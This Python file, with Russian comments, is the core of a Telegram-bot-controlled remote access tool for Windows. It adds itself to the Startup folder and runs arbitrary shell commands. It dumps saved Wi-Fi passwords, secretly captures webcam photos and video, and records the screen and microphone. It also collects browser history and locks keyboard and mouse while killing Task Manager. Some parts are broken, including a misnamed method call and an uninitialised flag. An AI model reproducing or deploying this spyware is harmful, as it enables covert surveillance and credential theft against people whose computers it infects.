import ctypes
import getpass
import io
import os
import subprocess
import threading
import time
import wave
import cv2
import keyboard
import numpy as np
import psutil as psutil
import pyaudio
import pyautogui
import pyttsx3
import webbrowser
import win32con
import win32gui

from aiogram import types
from pynput.mouse import Controller
from browser_history.browsers import OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome


class RemoteManager:

    def __init__(self, bot):
        self.bot = bot
        self.USER_NAME = getpass.getuser()
        self.width, self.height = pyautogui.size()

    # добавляет .bat файл в автозагрузку
    def add_to_startup(self, file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % self.USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def execute(self, command):
        try:
            if command[0] == 'cd' and len(command) > 1:
                result = self.change_directory(command[1])
            elif command[0] == 'wifi':
                result = self.get_passwords()
            else:
                result = self.execute_command_console(command)

        except Exception:
            result = "[-] Error"

        return result if not result.isspace() else "Неизвестная комманда"

    # выполняет введеную консольную команду
    def execute_command_console(self, command):
        child = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        my_out = io.TextIOWrapper(child.stdout, encoding='cp866')
        shell_output_string = ' '
        res = ''
        while shell_output_string:
            shell_output_string = my_out.readline()
            new_string = ' '.join(shell_output_string.split()) + '\n'
            res += new_string

        return res

    # открывает указанную веб-страницу
    def open_url(self, url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
        webbrowser.open(url, new=1)

    # выводит имена беспроводных сетей Wi-fi и пароли от них соответственно
    def get_passwords(self):
        wifi_list = self.execute_command_console("netsh wlan show profiles")

        data = wifi_list.split('\n')

        names = []
        for i in data:
            if "Все профили пользователей" in i:
                i = i.split(":")
                i = i[1]
                i = i[1::]
                names.append(i)

        passwords = []
        for name in names:
            password_list = self.execute_command_console(f'netsh wlan show profile name="{name}" key=clear')
            data = password_list.split('\n')
            for i in data:
                if "Содержимое ключа" in i:
                    i = i.split(":")
                    i = i[1]
                    i = i[1::]
                    passwords.append(i)

        res = ''
        for i in range(len(passwords)):
            res += f"{names[i]} : {passwords[i]}\n"

        return res

    # смена текущей директории на указанную пользователем
    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Смена директории на {self.execute_command_console('cd')}"
        except FileNotFoundError:
            return "Данный path/file/dir не найден"
        except OSError:
            return "Синтаксическая ошибка в имени path/file/dir"

    # озвучивает текст, введеный пользователем
    async def say_text(self, text):
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    def block_input(self):
        if not self.block_input_flag:
            self.block_input_flag = True
            t1 = threading.Thread(target=self.blockinput_start)
            t1.start()

            result = "Ввод заблокирован!"
        else:
            result = "Уже заблокировано!"

        return result

    # разрешает пользователю использовать устройства ввода
    def block_input_stop(self):
        if self.block_input_flag:
            for i in range(150):
                keyboard.unblock_key(i)
            self.block_input_flag = False

            result = "Ввод разблокирован"
        else:
            result = "Ввод уже разблокирован"

        return result

    # запрещает пользователю использовать устройства ввода. (а эта функция нужна? ты же используешь blockinput)
    def block_input_start(self):
        mouse = Controller()
        for i in range(150):
            keyboard.block_key(i)
        while self.block_input_flag:
            for proc in psutil.process_iter():
                mouse.position = (0, 0)
                if proc.name().lower() == 'taskmgr.exe':
                    proc.terminate()

    # фото с веб-камеры
    def make_cam_photo(self):
        cap = cv2.VideoCapture(0)

        # Check if the webcam is opened correctly
        if not cap.isOpened():
            return False

        ret, frame = cap.read()
        # уменьшить в 2 раза
        frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
        cv2.imwrite("screen_camera.png", frame)

        cap.release()
        cv2.destroyAllWindows()

        return True

    # запись видео веб-камеры без звука
    def make_cam_video(self, time):
        # умножать на кол-во кадров в секунду
        time_converted = time * 20

        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            return "Ошибка! Веб-камера выключена, либо она отсутствует."

        cap.set(cv2.CAP_PROP_FPS, 20)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        codec = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))

        frames = 0
        while True:
            ret, frame = cap.read()
            out.write(frame)

            time.sleep(0.03)
            frames += 1
            if frames > time_converted:
                break

        out.release()
        cap.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='webvideo.avi')

    # запись видео рабочего стола без звука
    def make_desktop_video(self, duration):
        # умножать на кол-во кадров в секунду
        time_converted = duration * 20

        codec = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('deskvideo.avi', codec, 20, (self.width, self.height))

        frames = 0
        while True:
            image = pyautogui.screenshot(region=(0, 0, self.width, self.height))
            frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            out.write(frame)

            time.sleep(0.03)
            frames += 1
            if frames > time_converted:
                break

        out.release()
        cv2.destroyAllWindows()

        return types.InputFile(path_or_bytesio='deskvideo.avi')

    # запись звука микрофона
    def make_audiofile_from_micro(self, time):
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        WAVE_OUTPUT_FILENAME = "file.wav"

        audio = pyaudio.PyAudio()

        # старт записи
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * time)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()

        return types.InputFile(path_or_bytesio='file.wav')

    browsers = [OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome]

    # выводит историю каждого браузера, находящегося в массиве 'browsers'
    def get_history(self, date):
        all_history = f'История браузеров на {date}, вы можете указать дату в формате команды \n' \
                      f'/history 2022-08-10 \n'
        for browser in self.browsers:
            try:
                br = browser()
                output_history = br.fetch_history()

                history = output_history.histories

                browser_his = ""
                for h in history:
                    if str(h[0].date()) == date:
                        browser_his += '-- ' + h[1] + '\n\n'

                if browser_his:
                    all_history += f"История {br.name} \n" + browser_his
                else:
                    all_history += f"История {br.name} на {date} пуста \n"

            except FileNotFoundError:
                all_history += str(browser.name + ": Браузер не найден \n")
            except AssertionError:
                all_history += str(browser.name + ": Браузер не поддерживается ОС \n")

        return all_history

    # меняет фон рабочего стола
    def change_background(self, path='C:\\Users\\Dima\\PycharmProjects\\tgbot'):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

    # вводит ПК в спящий режим
    def turn_off_screen(self):
        win32gui.SendMessage(win32con.HWND_BROADCAST,
                             win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)

    # выводит ПК из спящего режима
    def turn_on_screen(self):
        pyautogui.click()

    # печатает указанный пользователем текст в течение указанного пользователем времени
    def typing_keyboard_remotely(self, duration, text_of_message):
        start_time = time.perf_counter()
        while time.perf_counter() - start_time <= duration:
            keyboard.write(f"{text_of_message}\n", delay=0.1)

    # включает музыку(плейлист cringe <3) с задержкой в 4 секунды
    def play_music(self):
        # мой плейлист с: фармим прослушивания
        webbrowser.open('https://vk.com/audios254899850?section=all&z=audio_playlist254899850_135')
        # чтобы страничка успела прогрузиться
        time.sleep(4)
        # курсор наводится на кнопку "перемешать всё"
        pyautogui.moveTo(self.width / 2, self.height / 4 + 25)
        pyautogui.click()
